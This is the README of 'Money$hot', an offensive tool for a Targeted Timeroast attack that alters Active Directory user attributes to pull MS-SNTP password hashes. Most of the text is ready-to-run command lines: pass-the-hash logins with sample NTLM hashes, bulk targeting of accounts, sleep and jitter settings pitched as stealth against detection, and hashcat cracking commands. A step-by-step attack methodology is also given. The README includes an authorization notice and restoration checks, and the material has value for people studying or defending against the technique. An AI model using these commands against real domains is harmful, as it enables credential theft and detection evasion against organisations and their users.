# Money$hot

```
                                _  _           _
  /\/\   ___  _ __   ___ _   _ | || |__   ___ | |_
 /    \ / _ \| '_ \ / _ \ | | / __) '_ \ / _ \| __|
/ /\/\ \ (_) | | | |  __/ |_| \__ \ | | | (_) | |_
\/    \/\___/|_| |_|\___|\__, (   /_| |_|\___/ \__|
                         |___/ |_|
```

## Overview

**Money$hot** is an enhanced Python implementation of the Targeted Timeroast attack. This tool exploits Active Directory configurations by temporarily manipulating user attributes to extract password hashes via MS-SNTP protocol.

### Key Enhancements

🔓 **No Domain Join Required** - Execute attacks from any network position with LDAP connectivity
🔑 **NTLM Hash Authentication** - Authenticate using captured NTLM hashes instead of cleartext passwords
🛡️ **Enhanced Safety Features** - Comprehensive attribute restoration verification with interactive prompts
⚡ **Sleep & Jitter Control** - Configurable sleep timing with randomization for stealth operations
📊 **Verbose Logging** - Detailed operation tracking and status reporting

## Features

### Authentication Methods
- **Username/Password**: Traditional domain authentication
- **NTLM Hash**: Pass-the-hash authentication using LM:NT or NT-only formats
- **Flexible LDAP**: Direct LDAP connections without domain membership requirements

### Attack Capabilities
- **Single Target**: Attack individual users by username
- **Bulk Operations**: Process multiple targets from file input
- **MS-SNTP Exploitation**: Extract password hashes using MS-SNTP protocol timing attacks
- **Hashcat Compatible**: Output format ready for hashcat mode 31300

### Safety & Reliability
- **Attribute Verification**: Confirms successful attribute modifications before attacks
- **Automatic Restoration**: Restores original user attributes after each operation
- **Restoration Verification**: Validates successful attribute restoration with detailed output
- **Interactive Safety Prompts**: Pauses execution if restoration fails, requiring user confirmation
- **Error Handling**: Comprehensive exception handling with detailed error messages

### Output & Reporting
- **Console Output**: Real-time status updates and hash display (username format)
- **Dual File Output**: Save hashes in both username and pure hashcat formats simultaneously
- **Username Format**: Saves as `username:$sntp-ms$hash$salt` for identification purposes
- **Hashcat Format**: Saves as `$sntp-ms$hash$salt` for direct hashcat input
- **Verbose Mode**: Detailed operational logging for troubleshooting
- **Quiet Mode**: Minimal output for stealth operations

## Installation

```bash
# Clone the repository
git clone https://github.com/matsmi7h/MoneyShot.git
cd MoneyShot

# Install dependencies
pip install -r requirements.txt
```

## Usage

### Basic Syntax
```bash
python moneyshot.py <domain_controller> -d <domain> -u <username> [auth_method] [target_method] [options]
```

### Authentication Examples

**Using Password:**
```bash
python moneyshot.py dc01.example.com -d example.com -u administrator -p Password123 --victim testuser
```

**Using NTLM Hash (NT only):**
```bash
python moneyshot.py dc01.example.com -d example.com -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c --victim testuser
```

**Using NTLM Hash (LM:NT format):**
```bash
python moneyshot.py dc01.example.com -d example.com -u administrator -H e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c --victim testuser
```

### Target Selection

**Single Target:**
```bash
python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --victim john.doe
```

**Multiple Targets from File:**
```bash
python moneyshot.py dc01.example.com -d example.com -u admin -H hash --file targets.txt
```

**Example targets.txt:**
```
john.stephens
jane.smith
bob.wilson
admin.user
```

### Advanced Options

**Custom Sleep Timing:**
```bash
python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --victim testuser --sleep 1.5
```

**Sleep with Jitter (Stealth Mode):**
```bash
python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --victim testuser --sleep 2.0 --jitter 30
```

**SSL Connection:**
```bash
python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --victim testuser --ssl --port 636
```

**Verbose Output:**
```bash
python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --victim testuser -v
```

**Save Username Format to File:**
```bash
python moneyshot.py dc01.example.com -d example.com -u admin -p pass123 --file targets.txt -o usernames.txt
```

**Save Pure Hashcat Format to File:**
```bash
python moneyshot.py dc01.example.com -d example.com -u admin -H hash --victim testuser --hashcat hashes.txt
```

**Save Both Formats Simultaneously:**
```bash
python moneyshot.py dc01.example.com -d example.com -u admin -H hash --file targets.txt -o usernames.txt --hashcat hashes.txt
```

## Command Line Options

| Option | Description | Default |
|--------|-------------|---------|
| `domain_controller` | Domain controller hostname/IP address | Required |
| `-d, --domain` | Domain name (e.g., example.com) | Required |
| `-u, --username` | Username for authentication | Required |
| `-p, --password` | Password for authentication | - |
| `-H, --hash` | NTLM hash (LM:NT or NT only) | - |
| `--victim` | Single target username | - |
| `--file` | File with target usernames (one per line) | - |
| `-o, --output` | Output file for hashes in username:hash format | stdout |
| `--hashcat` | Output file for pure hashcat format (removes username prefix) | - |
| `--sleep` | Seconds to sleep between requests (supports decimals) | 0.006 |
| `--jitter` | Jitter percentage for sleep timing (0-100) | 0 |
| `--timeout` | NTP timeout in seconds | 24 |
| `--source-port` | Custom source port for NTP | Random |
| `--ssl` | Use SSL for LDAP connection | False |
| `--port` | LDAP port (389 or 636 for SSL) | 389 |
| `-q, --quiet` | Minimal output mode | False |
| `-v, --verbose` | Detailed logging | False |

## Technical Details

### Attack Methodology

1. **Target Identification**: Queries LDAP to retrieve user Distinguished Name, RID, and current userAccountControl value
2. **Attribute Manipulation**: Temporarily modifies:
   - `userAccountControl`: Changes from `NORMAL_ACCOUNT` (512) to `WORKSTATION_TRUST_ACCOUNT` (4096)
   - `sAMAccountName`: Appends `$` suffix if not present
3. **MS-SNTP Exploitation**: Sends crafted NTP packets containing the user's RID to extract password hash
4. **Hash Extraction**: Processes 68-byte NTP responses to extract MD5 hash and salt
5. **Attribute Restoration**: Restores original attribute values and verifies successful restoration

### Output Formats

**Default Output (Username Format)**:
```
<username>:$sntp-ms$<hash>$<salt>
```

Example:
```
testuser:$sntp-ms$a1b2c3d4e5f6789012345678901234567$0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
```

**Hashcat Format** (using `--hashcat` option):
```
$sntp-ms$<hash>$<salt>
```

Example:
```
$sntp-ms$a1b2c3d4e5f6789012345678901234567$0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
```

### Cracking with Hashcat

**Using Username Format File:**
```bash
# Remove usernames first, then crack
cut -d: -f2- usernames.txt > hashes_only.txt
hashcat -m 31300 hashes_only.txt wordlist.txt
```

**Using Pure Hashcat Format File:**
```bash
# Direct input to hashcat
hashcat -m 31300 hashes.txt wordlist.txt
```

## Safety Considerations

### Attribute Restoration
- Money$hot automatically restores all modified attributes after each operation
- Verification confirms successful restoration with detailed output
- Interactive prompts halt execution if restoration fails
- Manual intervention required for failed restorations to prevent account compromise

### Operational Security
- Use appropriate sleep timing and jitter to avoid detection patterns
- Monitor domain controller logs for suspicious activity
- Test in isolated environments before production use
- Ensure proper authorization before conducting assessments
- Consider using `--sleep 2.0 --jitter 50` for stealth operations

### Error Handling
- Comprehensive exception handling prevents script crashes
- Detailed error messages assist with troubleshooting
- Failed operations are clearly identified and logged
- Restoration always attempted regardless of attack success/failure

## Dependencies

- **Python 3.6+**: Core runtime environment
- **ldap3**: LDAP operations and NTLM authentication
- **Standard Library**: socket, struct, argparse, sys, time

## Legal Notice

This tool is intended for authorized penetration testing and security assessment purposes only. Users are responsible for ensuring proper authorization before conducting any testing. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

## Credits

- **Original Concept**: Jacopo (antipatico) Scannella - Timeroasting technique - https://github.com/SecuraBV/Timeroast
- **Targeted Implementation**: Giulio Pierantoni - Targeted Timeroast modifications - https://github.com/OffsecDeer/TargetedTimeroast

